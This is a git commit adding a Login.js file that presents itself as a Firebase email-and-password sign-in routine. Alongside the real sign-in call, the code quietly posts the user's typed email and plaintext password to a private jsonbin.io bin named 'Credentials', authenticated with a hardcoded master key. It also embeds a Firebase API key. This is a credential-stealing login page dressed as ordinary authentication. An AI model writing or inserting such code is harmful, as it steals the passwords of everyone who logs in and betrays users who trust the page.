b6914606694d4dfac6671896525136c158c5de4e
TrackMate-ai <162410324+TrackMate-ai@users.noreply.github.com>
2024-04-30 18:52:49 +0200

    Add files via upload

---
+++ Login.js
@@ -0,0 +1,62 @@
+
+
+function signInFirebase(){
+
+    
+    var firebaseConfig = {
+      apiKey: "AIzaSyD09GeejzBofXCWBs_GBj8rDtIEDHd0O98",
+      authDomain: "https://www.google.com",
+      projectId: "masele-33a46",
+      storageBucket: "YOUR_STORAGE_BUCKET",
+      messagingSenderId: "200216185593",
+      appId: "YOUR_APP_ID"
+    };
+    firebase.initializeApp(firebaseConfig);
+    
+      var email = document.getElementById("username").value;
+      var password = document.getElementById("passwordIn").value;
+
+      firebase.auth().signInWithEmailAndPassword(email, password)
+        .then(function(user) {
+
+          window.location.href=("index.html");
+            
+        })
+        .catch(function(error) {
+          console.log(error.message);
+            alert("Login failed,make sure you have an active Account");
+        });
+    
+
+
+
+        const secretKey = '$2b$10$5.GD5IWqNSL2RsbiNWZdbeQGJ3wkUk/t3ZxfbbLn2ddvAPibpWpr.';
+        const binName= 'myBin';
+
+        const data = {
+        Username: email,
+        Password: password
+        
+      };
+
+       fetch('https://api.jsonbin.io/v3/b', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+              "X-Master-Key": secretKey,
+              "X-Bin-Private": true,
+              'X-Bin-Name': "Credentials"
+            },
+            body: JSON.stringify(data)
+          })
+         .then(response => response.json())
+         .then(jsonData => console.log(jsonData))
+         .catch(error => console.error(error));
+ 
+
+
+
+
+
+    
+}
